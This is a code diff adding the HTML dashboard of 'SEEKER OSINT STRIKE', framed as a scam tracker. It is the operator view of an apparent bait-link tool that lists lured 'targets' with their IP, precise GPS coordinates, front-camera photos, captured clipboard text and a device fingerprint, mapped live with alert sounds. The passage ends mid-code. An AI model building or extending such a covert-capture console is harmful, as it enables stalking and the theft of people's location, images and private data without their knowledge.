@@ -1,0 +1,867 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SEEKER OSINT STRIKE - Scam Tracker Dashboard</title>
+  
+  <!-- CSS Dependencies -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" integrity="sha256-p4NxAoJBhIIN+hmNHrzRCf9tD/miZyoHS5obTRR9BMY=" crossorigin=""/>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+  
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          fontFamily: {
+            sans: ['Outfit', 'sans-serif'],
+            mono: ['JetBrains Mono', 'monospace'],
+          }
+        }
+      }
+    }
+  </script>
+  
+  <style>
+    body {
+      background: radial-gradient(circle at top right, #100f2e, #050510);
+      color: #e2e8f0;
+      overflow-x: hidden;
+    }
+    .glass-card {
+      background: rgba(15, 23, 42, 0.45);
+      backdrop-filter: blur(12px);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
+    }
+    .glass-card-hover:hover {
+      background: rgba(30, 41, 59, 0.6);
+      border-color: rgba(99, 102, 241, 0.35);
+      transform: translateY(-2px);
+      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+    }
+    .custom-scroll::-webkit-scrollbar {
+      width: 6px;
+    }
+    .custom-scroll::-webkit-scrollbar-track {
+      background: rgba(15, 23, 42, 0.1);
+    }
+    .custom-scroll::-webkit-scrollbar-thumb {
+      background: rgba(255, 255, 255, 0.15);
+      border-radius: 9px;
+    }
+    .custom-scroll::-webkit-scrollbar-thumb:hover {
+      background: rgba(99, 102, 241, 0.4);
+    }
+    .radar-pulse {
+      animation: pulse 2s infinite;
+    }
+    @keyframes pulse {
+      0% {
+        box-shadow: 0 0 0 0 rgba(34, 197, 94, 0.7);
+      }
+      70% {
+        box-shadow: 0 0 0 10px rgba(34, 197, 94, 0);
+      }
+      100% {
+        box-shadow: 0 0 0 0 rgba(34, 197, 94, 0);
+      }
+    }
+    @keyframes flashHighlight {
+      0% { border-color: rgba(6, 182, 212, 0.8); box-shadow: 0 0 8px rgba(6, 182, 212, 0.3); }
+      50% { border-color: rgba(6, 182, 212, 0.3); box-shadow: 0 0 3px rgba(6, 182, 212, 0.1); }
+      100% { border-color: rgba(255, 255, 255, 0.05); box-shadow: none; }
+    }
+    .flash-highlight {
+      animation: flashHighlight 1.5s ease-out;
+    }
+    #map {
+      height: 100%;
+      width: 100%;
+      border-radius: 12px;
+      z-index: 10;
+    }
+    /* Customize Leaflet dark theme appearance */
+    .leaflet-container {
+      background: #0f172a !important;
+    }
+    .leaflet-popup-content-wrapper {
+      background: rgba(15, 23, 42, 0.9) !important;
+      color: #f1f5f9 !important;
+      backdrop-filter: blur(10px);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+    }
+    .leaflet-popup-tip {
+      background: rgba(15, 23, 42, 0.9) !important;
+    }
+  </style>
+</head>
+<body class="h-screen flex flex-col font-sans antialiased select-none">
+
+  <!-- Header -->
+  <header class="h-14 lg:h-16 shrink-0 border-b border-white/5 px-3 lg:px-6 flex items-center justify-between glass-card z-20">
+    <div class="flex items-center gap-2 lg:gap-3">
+      <div class="h-8 w-8 lg:h-10 lg:w-10 rounded-xl bg-indigo-600/30 flex items-center justify-center border border-indigo-500/30 shadow-[0_0_15px_rgba(99,102,241,0.2)]">
+        <i class="fa-solid fa-crosshairs text-indigo-400 text-sm lg:text-lg animate-spin" style="animation-duration: 6s;"></i>
+      </div>
+      <div>
+        <h1 class="text-sm lg:text-lg font-bold tracking-wide bg-gradient-to-r from-indigo-400 via-purple-400 to-pink-400 bg-clip-text text-transparent uppercase">SEEKER OSINT STRIKE</h1>
+        <p class="text-[10px] lg:text-xs text-slate-400 flex items-center gap-1 lg:gap-1.5"><span class="h-1 lg:h-1.5 w-1 lg:w-1.5 rounded-full bg-emerald-500 radar-pulse"></span> PEMANTAUAN DINAMIS AKTIF</p>
+      </div>
+    </div>
+    
+    <div class="flex items-center gap-2 lg:gap-4">
+      <button onclick="playSonarSound()" class="h-8 lg:h-9 px-2 lg:px-3 rounded-lg border border-slate-700 bg-slate-800/40 hover:bg-slate-700/50 hover:text-white transition flex items-center gap-1 lg:gap-2 text-[10px] lg:text-xs font-medium text-slate-300">
+        <i class="fa-solid fa-volume-high text-indigo-400"></i> <span class="hidden sm:inline">Tes Sonar</span>
+      </button>
+      <div class="text-[10px] lg:text-xs text-slate-400 font-mono bg-slate-900/60 border border-white/5 py-1 lg:py-1.5 px-2 lg:px-3 rounded-lg flex items-center gap-1 lg:gap-2">
+        <i class="fa-solid fa-clock text-indigo-400"></i> <span id="current-time">00:00:00</span>
+      </div>
+    </div>
+  </header>
+
+  <!-- Main Workstation Layout -->
+  <main class="flex-1 flex flex-col lg:flex-row overflow-hidden p-3 lg:p-6 gap-3 lg:gap-6 relative">
+    
+    <!-- Left Panel: Sidebar log -->
+    <section class="w-full lg:w-96 shrink-0 flex flex-col gap-3 lg:gap-4 overflow-hidden">
+      <!-- Stats Summary cards -->
+      <div class="grid grid-cols-4 lg:grid-cols-2 gap-2 lg:gap-3 shrink-0">
+        <div class="glass-card rounded-xl p-2 lg:p-3 flex flex-col gap-1">
+          <span class="text-[10px] lg:text-xs text-slate-400 uppercase font-semibold">Total Target</span>
+          <span id="stat-total" class="text-xl lg:text-2xl font-bold font-mono tracking-tight text-white">0</span>
+        </div>
+        <div class="glass-card rounded-xl p-2 lg:p-3 flex flex-col gap-1">
+          <span class="text-[10px] lg:text-xs text-slate-400 uppercase font-semibold">GPS Akurat</span>
+          <span id="stat-gps" class="text-xl lg:text-2xl font-bold font-mono tracking-tight text-emerald-400 flex items-center gap-1.5">
+            0 <span class="text-[10px] lg:text-xs font-normal text-slate-400">(0%)</span>
+          </span>
+        </div>
+        <div class="glass-card rounded-xl p-2 lg:p-3 flex flex-col gap-1">
+          <span class="text-[10px] lg:text-xs text-slate-400 uppercase font-semibold">VPN / Proxy</span>
+          <span id="stat-vpn" class="text-xl lg:text-2xl font-bold font-mono tracking-tight text-amber-400 flex items-center gap-1.5">
+            0 <span class="text-[10px] lg:text-xs font-normal text-slate-400">(0%)</span>
+          </span>
+        </div>
+        <div class="glass-card rounded-xl p-2 lg:p-3 flex flex-col gap-1">
+          <span class="text-[10px] lg:text-xs text-slate-400 uppercase font-semibold">GPS Ditolak</span>
+          <span id="stat-denied" class="text-xl lg:text-2xl font-bold font-mono tracking-tight text-rose-400 flex items-center gap-1.5">
+            0
+          </span>
+        </div>
+      </div>
+      
+      <!-- Bot Filter Toggle -->
+      <div class="flex items-center justify-between glass-card rounded-xl p-2 lg:p-2.5 shrink-0">
+        <div class="flex items-center gap-2">
+          <i class="fa-solid fa-robot text-rose-400 text-xs"></i>
+          <span class="text-[10px] lg:text-xs text-slate-400 uppercase font-semibold">Bot/Crawler</span>
+          <span id="stat-bot" class="text-[10px] lg:text-xs font-bold font-mono text-rose-400">0</span>
+        </div>
+        <button id="bot-toggle" onclick="toggleBots()" class="text-[9px] lg:text-[10px] px-2 lg:px-2.5 py-1 rounded border border-rose-500/30 bg-rose-500/15 text-rose-400 hover:bg-rose-500/25 transition-colors font-medium">
+          <i class="fa-solid fa-eye-slash text-[8px]"></i> Disembunyikan
+        </button>
+      </div>
+      
+      <!-- List container -->
+      <div class="flex-1 glass-card rounded-xl overflow-hidden flex flex-col max-h-[40vh] lg:max-h-none">
+        <div class="px-3 lg:px-4 py-2 lg:py-3 border-b border-white/5 flex justify-between items-center bg-slate-950/20 shrink-0">
+          <h2 class="text-xs lg:text-sm font-bold uppercase tracking-wider text-slate-300 flex items-center gap-2">
+            <i class="fa-solid fa-list-ul text-indigo-400"></i> Log Aktivitas Tangkapan
+          </h2>
+          <span class="text-[9px] lg:text-[10px] bg-indigo-500/20 border border-indigo-500/30 text-indigo-300 font-mono py-0.5 px-2 rounded-full uppercase tracking-wider">Terupdate</span>
+        </div>
+        
+        <!-- Live stream feed list -->
+        <div id="targets-list" class="flex-1 overflow-y-auto p-2 lg:p-3 flex flex-col gap-2 lg:gap-2.5 custom-scroll">
+          <div class="text-slate-400 text-center py-10 flex flex-col items-center justify-center gap-3">
+            <i class="fa-solid fa-satellite-dish text-3xl text-slate-500 animate-pulse"></i>
+            <p class="text-sm">Menunggu target memicu umpan...</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Center/Right Panel: Interactive Map and Sidebar Details -->
+    <section class="flex-1 flex flex-col lg:flex-row gap-3 lg:gap-6 overflow-hidden relative z-10 min-h-[50vh] lg:min-h-0">
+      
+      <!-- Map Container -->
+      <div class="flex-1 glass-card rounded-xl overflow-hidden p-1 relative flex flex-col min-h-[40vh] lg:min-h-0">
+        <div class="absolute top-2 lg:top-4 right-2 lg:right-4 z-20 flex gap-2">
+          <!-- Custom map controls or badges -->
+          <div class="glass-card text-[10px] lg:text-xs font-medium py-1 lg:py-1.5 px-2 lg:px-3 rounded-lg text-emerald-400 flex items-center gap-1 lg:gap-1.5 border-emerald-500/20">
+            <span class="h-1.5 lg:h-2 w-1.5 lg:w-2 rounded-full bg-emerald-500 radar-pulse"></span> MAP API: READY
+          </div>
+        </div>
+        <div id="map" class="flex-1"></div>
+      </div>
+
+      <!-- Detail Panel (Overlay right side of map or as distinct sidebar) -->
+      <div id="detail-panel" class="fixed inset-0 lg:static lg:w-80 lg:shrink-0 glass-card rounded-xl lg:rounded-xl p-3 lg:p-4 flex flex-col gap-3 lg:gap-4 overflow-y-auto custom-scroll hidden z-50 lg:z-auto">
+        <div class="border-b border-white/5 pb-2 lg:pb-3 flex justify-between items-center sticky top-0 bg-slate-900/95 lg:bg-transparent z-10">
+          <h3 class="text-xs lg:text-sm font-bold uppercase text-slate-300">Intelijen Detail</h3>
+          <button onclick="closeDetails()" class="h-8 w-8 lg:h-7 lg:w-7 rounded-lg text-slate-400 hover:text-white hover:bg-slate-800 flex items-center justify-center"><i class="fa-solid fa-xmark"></i></button>
+        </div>
+        
+        <div class="flex flex-col gap-3.5">
+          <!-- Session Header info -->
+          <div class="bg-indigo-950/20 border border-indigo-500/10 rounded-xl p-3 flex flex-col gap-1">
+            <span class="text-[10px] text-indigo-400 font-bold tracking-widest font-mono uppercase">SESSION ID</span>
+            <span id="detail-sid" class="text-sm font-mono font-bold text-white tracking-tight break-all">N/A</span>
+            <span id="detail-time" class="text-xs text-slate-400 mt-1">Capture: N/A</span>
+          </div>
+
+          <!-- Geografi -->
+          <div>
+            <h4 class="text-xs font-bold text-slate-400 uppercase tracking-wider mb-2">Lokasi Terestimasi</h4>
+            <table class="w-full text-xs font-mono">
+              <tr class="border-b border-white/5"><td class="py-1.5 text-slate-400">Negara</td><td id="detail-country" class="py-1.5 text-right text-white font-medium">N/A</td></tr>
+              <tr class="border-b border-white/5"><td class="py-1.5 text-slate-400">Provinsi/Kota</td><td id="detail-city" class="py-1.5 text-right text-white font-medium">N/A</td></tr>
+              <tr class="border-b border-white/5"><td class="py-1.5 text-slate-400">ISP</td><td id="detail-isp" class="py-1.5 text-right text-white font-medium break-all">N/A</td></tr>
+              <tr class="border-b border-white/5"><td class="py-1.5 text-slate-400">Organisasi</td><td id="detail-org" class="py-1.5 text-right text-white font-medium break-all">N/A</td></tr>
+              <tr class="border-b border-white/5"><td class="py-1.5 text-slate-400">IP Publik</td><td id="detail-ip" class="py-1.5 text-right text-indigo-300 font-bold">N/A</td></tr>
+              <tr class="border-b border-white/5"><td class="py-1.5 text-slate-400">Tipe VPN</td><td id="detail-vpn-status" class="py-1.5 text-right font-bold">N/A</td></tr>
+            </table>
+          </div>
+
+          <!-- GPS (Jika Tersedia) -->
+          <div id="detail-gps-section" class="bg-slate-900/40 rounded-xl p-3 border border-white/5 hidden">
+            <h4 class="text-xs font-bold text-emerald-400 uppercase tracking-wider mb-2 flex items-center gap-1.5">
+              <i class="fa-solid fa-satellite text-sm"></i> Koordinat GPS Satelit
+            </h4>
+            <table class="w-full text-xs font-mono">
+              <tr class="border-b border-white/5"><td class="py-1 text-slate-400">Latitude</td><td id="detail-lat" class="py-1 text-right text-white font-bold">N/A</td></tr>
+              <tr class="border-b border-white/5"><td class="py-1 text-slate-400">Longitude</td><td id="detail-lon" class="py-1 text-right text-white font-bold">N/A</td></tr>
+              <tr class="border-b border-white/5"><td class="py-1 text-slate-400">Akurasi GPS</td><td id="detail-accuracy" class="py-1 text-right text-emerald-400 font-bold">N/A</td></tr>
+              <tr class="border-b border-white/5"><td class="py-1 text-slate-400">Ketinggian</td><td id="detail-altitude" class="py-1 text-right text-white">N/A</td></tr>
+              <tr class="border-b border-white/5"><td class="py-1 text-slate-400">Kecepatan</td><td id="detail-speed" class="py-1 text-right text-white">N/A</td></tr>
+            </table>
+            
+            <a id="detail-gmaps-link" href="#" target="_blank" class="mt-3 w-full bg-emerald-600 hover:bg-emerald-500 text-white text-xs font-bold py-2 px-3 rounded-lg text-center flex items-center justify-center gap-2 transition shadow-[0_0_10px_rgba(16,185,129,0.3)]">
+              <i class="fa-solid fa-map-location-dot"></i> Buka Google Maps
+            </a>
+          </div>
+
+          <!-- Kamera (Jika Ada) -->
+          <div id="detail-camera-section" class="bg-slate-900/40 rounded-xl p-3 border border-white/5 hidden">
+            <h4 class="text-xs font-bold text-pink-400 uppercase tracking-wider mb-2 flex items-center gap-1.5">
+              <i class="fa-solid fa-camera text-sm"></i> Foto Kamera Depan
+            </h4>
+            <img id="detail-camera-img" src="" alt="Camera Capture" class="w-full rounded-lg border border-white/10 mb-2" style="max-height: 240px; object-fit: cover;">
+            <div class="flex gap-2">
+              <a id="detail-camera-download" href="#" download="camera_capture.jpg" class="flex-1 bg-pink-600 hover:bg-pink-500 text-white text-xs font-bold py-2 px-3 rounded-lg text-center flex items-center justify-center gap-2 transition">
+                <i class="fa-solid fa-download"></i> Unduh
+              </a>
+            </div>
+          </div>
+
+          <!-- Clipboard (Jika Ada) -->
+          <div id="detail-clipboard-section" class="bg-slate-900/40 rounded-xl p-3 border border-white/5 hidden">
+            <div class="flex items-center justify-between mb-2">
+              <h4 class="text-xs font-bold text-cyan-400 uppercase tracking-wider flex items-center gap-1.5">
+                <i class="fa-solid fa-clipboard-list text-sm"></i> Clipboard / Copas Log
+              </h4>
+              <div id="clipboard-actions" class="flex gap-1">
+                <button onclick="copyAllClipboard()" title="Copy All" class="text-[10px] px-2 py-1 rounded bg-cyan-500/15 border border-cyan-500/25 text-cyan-400 hover:bg-cyan-500/25 transition-colors flex items-center gap-1">
+                  <i class="fa-solid fa-copy text-[8px]"></i> All
+                </button>
+                <button onclick="downloadClipboardLog()" title="Download Log" class="text-[10px] px-2 py-1 rounded bg-emerald-500/15 border border-emerald-500/25 text-emerald-400 hover:bg-emerald-500/25 transition-colors flex items-center gap-1">
+                  <i class="fa-solid fa-download text-[8px]"></i> TXT
+                </button>
+              </div>
+            </div>
+            <div id="clipboard-entries" class="flex flex-col gap-1.5 max-h-52 overflow-y-auto custom-scroll"></div>
+          </div>
+
+          <!-- Perangkat Keras -->
+          <div>
+            <h4 class="text-xs font-bold text-slate-400 uppercase tracking-wider mb-2">Sidik Jari Perangkat (Fingerprint)</h4>
+            <table class="w-full text-xs font-mono">
+              <tr class="border-b border-white/5"><td class="py-1.5 text-slate-400">Sistem Operasi</td><td id="detail-os" class="py-1.5 text-right text-white font-medium">N/A</td></tr>
+              <tr class="border-b border-white/5"><td class="py-1.5 text-slate-400">Merek / Brand</td><td id="detail-brand" class="py-1.5 text-right text-white font-medium">N/A</td></tr>
+              <tr class="border-b border-white/5"><td class="py-1.5 text-slate-400">Model</td><td id="detail-model" class="py-1.5 text-right text-white font-medium">N/A</td></tr>
+              <tr class="border-b border-white/5"><td class="py-1.5 text-slate-400">Browser</td><td id="detail-browser" class="py-1.5 text-right text-white font-medium">N/A</td></tr>
+              <tr class="border-b border-white/5"><td class="py-1.5 text-slate-400">RAM Perangkat</td><td id="detail-ram" class="py-1.5 text-right text-white">N/A</td></tr>
+              <tr class="border-b border-white/5"><td class="py-1.5 text-slate-400">Jumlah Core CPU</td><td id="detail-cores" class="py-1.5 text-right text-white">N/A</td></tr>
+              <tr class="border-b border-white/5"><td class="py-1.5 text-slate-400">Resolusi Layar</td><td id="detail-res" class="py-1.5 text-right text-white">N/A</td></tr>
+              <tr class="border-b border-white/5"><td class="py-1.5 text-slate-400">Render GPU</td><td id="detail-gpu" class="py-1.5 text-right text-slate-300 text-[10px] break-all leading-tight">N/A</td></tr>
+            </table>
+          </div>
+          
+        </div>
+      </div>
+
+    </section>
+  </main>
+
+  <!-- Javascript Dependencies -->
+  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js" integrity="sha256-20nQCchB9co0qIjJZRGuk2/Z9VM+kNiyxNV1lvTlZBo=" crossorigin=""></script>
+  
+  <script>
+    // Variables
+    let map = null;
+    let markersLayer = null;
+    let cachedResultsLength = 0;
+    let selectedSid = null;
+    let mapMarkers = {};
+    let showBots = false;
+    
+    // Web Audio API Synth Sound effect
+    function playSonarSound() {
+      try {
+        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        const osc = audioCtx.createOscillator();
+        const gain = audioCtx.createGain();
+        
+        osc.type = 'sine';
+        osc.frequency.setValueAtTime(987.77, audioCtx.currentTime); // B5 note (high tech tone)
+        osc.frequency.exponentialRampToValueAtTime(493.88, audioCtx.currentTime + 0.35); // ramp down to B4
+        
+        gain.gain.setValueAtTime(0.12, audioCtx.currentTime);
+        gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + 0.45);
+        
+        osc.connect(gain);
+        gain.connect(audioCtx.destination);
+        
+        osc.start();
+        osc.stop(audioCtx.currentTime + 0.5);
+      } catch (e) {
+        console.error("Web Audio error: ", e);
+      }
+    }
+
+    // Initialize Map
+    function initMap() {
+      // Create Map centered in Jakarta, Indonesia
+      map = L.map('map', {
+        zoomControl: false
+      }).setView([-2.5, 118.0], 5); // Center on Indonesia Archipelago
+      
+      // Standard zoom controls on top-left
+      L.control.zoom({
+        position: 'bottomleft'
+      }).addTo(map);
+
+      // Dark Mode Tile Layer (Premium look using CartoDB Dark Matter tiles)
+      L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
+        attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> &copy; <a href="https://carto.com/attributions">CARTO</a>',
+        subdomains: 'abcd',
+        maxZoom: 20
+      }).addTo(map);
+      
+      markersLayer = L.layerGroup().addTo(map);
+    }
+    
+    // Live update clock
+    setInterval(() => {
+      const now = new Date();
+      document.getElementById('current-time').innerText = now.toTimeString().split(' ')[0];
+    }, 1000);
+
+    // Format stats
+    function updateStats(results) {
+      let total = results.length;
+      let gpsCount = 0;
+      let vpnCount = 0;
+      let deniedCount = 0;
+      let botCount = 0;
+      
+      results.forEach(r => {
+        if (r.location && (r.location.status === 'success' || r.location.status === 'ip_fallback')) {
+          gpsCount++;
+        }
+        if (r.vpn && r.vpn.is_vpn === true) {
+          vpnCount++;
+        }
+        if (r.location && r.location.status === 'failed') {
+          deniedCount++;
+        }
+        if (r.is_bot === true) {
+          botCount++;
+        }
+      });
+      
+      document.getElementById('stat-total').innerText = total;
+      
+      let gpsPct = total > 0 ? Math.round((gpsCount / total) * 100) : 0;
+      document.getElementById('stat-gps').innerHTML = `${gpsCount} <span class="text-xs font-normal text-slate-400">(${gpsPct}%)</span>`;
+      
+      let vpnPct = total > 0 ? Math.round((vpnCount / total) * 100) : 0;
+      document.getElementById('stat-vpn').innerHTML = `${vpnCount} <span class="text-xs font-normal text-slate-400">(${vpnPct}%)</span>`;
+      
+      document.getElementById('stat-denied').innerText = deniedCount;
+      document.getElementById('stat-bot').innerText = botCount;
+    }
+
+    function escapeHtml(text) {
+      if (!text) return '';
+      var div = document.createElement('div');
+      div.appendChild(document.createTextNode(text));
+      return div.innerHTML;
+    }
+
+    // Helper to get OS icon
+    function getOSIcon(os) {
+      if (!os) return '<i class="fa-solid fa-laptop text-indigo-400 text-sm"></i>';
+      const lowercaseOS = os.toLowerCase();
+      if (lowercaseOS.includes('android')) return '<i class="fa-brands fa-android text-emerald-400 text-base"></i>';
+      if (lowercaseOS.includes('ios') || lowercaseOS.includes('mac') || lowercaseOS.includes('iphone') || lowercaseOS.includes('ipad') || lowercaseOS.includes('apple')) return '<i class="fa-brands fa-apple text-slate-300 text-base"></i>';
+      if (lowercaseOS.includes('windows')) return '<i class="fa-brands fa-windows text-sky-400 text-base"></i>';
+      if (lowercaseOS.includes('linux') || lowercaseOS.includes('ubuntu') || lowercaseOS.includes('debian')) return '<i class="fa-brands fa-linux text-amber-500 text-base"></i>';
+      return '<i class="fa-solid fa-laptop text-indigo-400 text-sm"></i>';
+    }
+
+    function toggleBots() {
+      showBots = !showBots;
+      var btn = document.getElementById('bot-toggle');
+      if (showBots) {
+        btn.innerHTML = '<i class="fa-solid fa-eye text-[8px]"></i> Ditampilkan';
+        btn.className = 'text-[10px] px-2.5 py-1 rounded border border-emerald-500/30 bg-emerald-500/15 text-emerald-400 hover:bg-emerald-500/25 transition-colors font-medium';
+      } else {
+        btn.innerHTML = '<i class="fa-solid fa-eye-slash text-[8px]"></i> Disembunyikan';
+        btn.className = 'text-[10px] px-2.5 py-1 rounded border border-rose-500/30 bg-rose-500/15 text-rose-400 hover:bg-rose-500/25 transition-colors font-medium';
+      }
+      renderDashboard();
+    }
+
+    // Render left targets list & map markers
+    function renderDashboard() {
+      // Check if seeker_results is defined (loaded from results.js)
+      if (typeof seeker_results === 'undefined') {
+        console.warn("No seeker_results found");
+        return;
+      }
+      
+      const results = seeker_results;
+      
+      // Update statistics
+      updateStats(results);
+      
+      // Trigger new capture alert sound
+      if (results.length > cachedResultsLength) {
+        if (cachedResultsLength > 0) {
+          playSonarSound();
+        }
+        cachedResultsLength = results.length;
+      }
+      
+      const listContainer = document.getElementById('targets-list');
+      
+      // Filter bots if hidden
+      var filteredResults = showBots ? results : results.filter(function(r) { return !r.is_bot; });
+
+      if (filteredResults.length === 0) {
+        listContainer.innerHTML = `
+          <div class="text-slate-400 text-center py-10 flex flex-col items-center justify-center gap-3">
+            <i class="fa-solid fa-satellite-dish text-3xl text-slate-500 animate-pulse"></i>
+            <p class="text-sm">Menunggu target memicu umpan...</p>
+          </div>
+        `;
+        markersLayer.clearLayers();
+        mapMarkers = {};
+        return;
+      }
+      
+      // Clear previous list
+      listContainer.innerHTML = '';
+      
+      // Clear markers layer
+      markersLayer.clearLayers();
+      const currentMarkers = {};
+      
+      // Render from newest to oldest
+      [...filteredResults].reverse().forEach(record => {
+        const sid = record.sid || 'N/A';
+        const isBot = record.is_bot === true;
+        const hasGps = record.location && (record.location.status === 'success');
+        const hasIpFallback = record.location && (record.location.status === 'ip_fallback');
+        const hasAnyCoords = hasGps || hasIpFallback;
+        const isVpn = record.vpn && record.vpn.is_vpn;
+        const deniedGps = record.location && record.location.status === 'failed';
+        const hasCamera = record.camera && record.camera.status === 'success';
+        const hasClipboard = record.clipboard && Array.isArray(record.clipboard) && record.clipboard.length > 0;
+        
+        let statusBadge = '';
+        let gpsStatus = 'Tanpa GPS';
+        
+        if (hasGps) {
+          statusBadge = '<span class="px-2 py-0.5 text-[9px] font-bold bg-emerald-500/20 border border-emerald-500/30 text-emerald-400 rounded-full flex items-center gap-1 uppercase"><i class="fa-solid fa-location-crosshairs text-[8px]"></i> GPS Aktif</span>';
+          gpsStatus = 'Akurat (GPS)';
+        } else if (hasIpFallback) {
+          statusBadge = '<span class="px-2 py-0.5 text-[9px] font-bold bg-amber-500/20 border border-amber-500/30 text-amber-400 rounded-full flex items-center gap-1 uppercase"><i class="fa-solid fa-map-pin text-[8px]"></i> Estimasi IP</span>';
+          gpsStatus = 'Estimasi (IP)';
+        } else if (deniedGps) {
+          statusBadge = '<span class="px-2 py-0.5 text-[9px] font-bold bg-rose-500/20 border border-rose-500/30 text-rose-400 rounded-full flex items-center gap-1 uppercase"><i class="fa-solid fa-ban text-[8px]"></i> GPS Ditolak</span>';
+          gpsStatus = 'Ditolak (Izin)';
+        } else {
+          statusBadge = '<span class="px-2 py-0.5 text-[9px] font-bold bg-amber-500/20 border border-amber-500/30 text-amber-400 rounded-full flex items-center gap-1 uppercase"><i class="fa-solid fa-map-pin text-[8px]"></i> Estimasi IP</span>';
+          gpsStatus = 'Estimasi (IP)';
+        }
+        
+        const vpnBadge = isVpn ? '<span class="px-2 py-0.5 text-[9px] font-bold bg-purple-500/20 border border-purple-500/30 text-purple-300 rounded-full uppercase tracking-wider flex items-center gap-1"><i class="fa-solid fa-shield-halved text-[8px]"></i> Proxy/VPN</span>' : '';
+        
+        const country = record.geo ? record.geo.country : 'N/A';
+        const city = record.geo ? record.geo.city : 'N/A';
+        const timestamp = record.timestamp || 'Baru';
+        const ip = record.ip || 'N/A';
+        const browser = record.browser || 'Browser';
+        const os = record.os || 'Unknown OS';
+        
+        const isp = record.geo ? record.geo.isp : '';
+        const org = record.geo ? record.geo.org : '';
+        const brand = record.brand || '';
+        const model = record.model || '';
+        const deviceLabel = (brand !== 'Not Available' && model !== 'Not Available') ? brand + ' ' + model : (model !== 'Not Available' ? model : '');
+
+        // Define beautiful card structure
+        const activeClass = selectedSid === sid ? 'border-indigo-500 bg-indigo-950/20 shadow-[0_0_15px_rgba(99,102,241,0.15)] shadow-indigo-500/10' : 'border-white/5 hover:border-slate-700 hover:bg-slate-800/20';
+        
+        const cardHtml = `
+          <div onclick="selectTarget('${sid}')" class="glass-card rounded-xl p-3.5 border ${activeClass} transition duration-200 cursor-pointer flex flex-col gap-2 relative">
+            <div class="flex items-center justify-between">
+              <span class="text-xs text-slate-400 font-mono flex items-center gap-1.5"><i class="fa-solid fa-fingerprint text-indigo-400"></i> ${sid.substring(0, 10)}...</span>
+              <span class="text-[10px] text-slate-500 font-mono">${timestamp}</span>
+            </div>
+            
+            <div class="flex items-center gap-2.5 mt-0.5">
+              <div class="h-9 w-9 rounded-lg bg-slate-900 flex items-center justify-center border border-white/5 shrink-0">
+                ${getOSIcon(os)}
+              </div>
+              <div class="flex-1 min-w-0">
+                <h3 class="text-sm font-bold text-white truncate">${city}, ${country}</h3>
+                <p class="text-xs text-slate-400 font-mono mt-0.5 flex items-center gap-1 truncate"><i class="fa-solid fa-network-wired text-indigo-400/70 text-[10px]"></i> ${ip}</p>
+                ${deviceLabel ? '<p class="text-[10px] text-slate-500 font-mono mt-0.5 truncate"><i class="fa-solid fa-mobile-screen text-emerald-400/60 text-[8px]"></i> ' + deviceLabel + '</p>' : ''}
+                ${(isp && isp !== 'N/A') ? '<p class="text-[10px] text-slate-500 font-mono mt-0.5 truncate"><i class="fa-solid fa-wifi text-amber-400/60 text-[8px]"></i> ' + isp + '</p>' : ''}
+              </div>
+            </div>
+            
+            <div class="flex flex-wrap gap-1.5 mt-1.5">
+              ${isBot ? '<span class="px-2 py-0.5 text-[9px] font-bold bg-rose-500/20 border border-rose-500/30 text-rose-400 rounded-full flex items-center gap-1 uppercase"><i class="fa-solid fa-robot text-[8px]"></i> Bot</span>' : ''}
+              ${statusBadge}
+              ${vpnBadge}
+              ${hasCamera ? '<span class="px-2 py-0.5 text-[9px] font-bold bg-pink-500/20 border border-pink-500/30 text-pink-400 rounded-full flex items-center gap-1 uppercase"><i class="fa-solid fa-camera text-[8px]"></i> Kamera</span>' : ''}
+              ${hasClipboard ? '<span class="px-2 py-0.5 text-[9px] font-bold bg-cyan-500/20 border border-cyan-500/30 text-cyan-400 rounded-full flex items-center gap-1 uppercase"><i class="fa-solid fa-clipboard-list text-[8px]"></i> Copas</span>' : ''}
+              <span class="px-2 py-0.5 text-[9px] text-slate-400 border border-slate-700 bg-slate-800/40 rounded-full font-mono flex items-center gap-1">
+                <i class="fa-solid fa-display text-[8px] text-indigo-400/70"></i> ${(brand !== 'Not Available' ? brand : os.split(' ')[0])}
+              </span>
+            </div>
+          </div>
+        `;
+        
+        listContainer.insertAdjacentHTML('beforeend', cardHtml);
+        
+        // --- ADD MAP MARKERS ---
+        let markerLat = null;
+        let markerLon = null;
+        let isEstimated = false;
+        
+        if (hasAnyCoords) {
+          // GPS or IP-fallback coords
+          markerLat = parseFloat(record.location.lat.replace(' deg', ''));
+          markerLon = parseFloat(record.location.lon.replace(' deg', ''));
+          isEstimated = hasIpFallback;
+        } else if (record.geo && record.geo.latitude && record.geo.longitude) {
+          // Fallback to IP Geolocation estimated coords
+          markerLat = parseFloat(record.geo.latitude);
+          markerLon = parseFloat(record.geo.longitude);
+          isEstimated = true;
+        }
+        
+        if (markerLat !== null && markerLon !== null && !isNaN(markerLat) && !isNaN(markerLon)) {
+          // Create custom styled beautiful DivIcon
+          const markerColor = isEstimated ? '#f59e0b' : '#10b981'; // Orange for IP estimation, Green for accurate GPS
+          const pulseClass = isEstimated ? '' : 'radar-pulse';
+          
+          const iconHtml = `
+            <div class="h-8 w-8 rounded-full border border-white/20 bg-slate-950 flex items-center justify-center shadow-lg relative ${pulseClass}" style="box-shadow: 0 0 10px ${markerColor}40;">
+              <i class="fa-solid ${hasGps ? 'fa-location-crosshairs' : hasAnyCoords ? 'fa-globe' : 'fa-map-pin'} text-xs" style="color: ${markerColor}"></i>
+              <div class="absolute -bottom-1 h-2 w-2 rounded-full" style="background-color: ${markerColor}"></div>
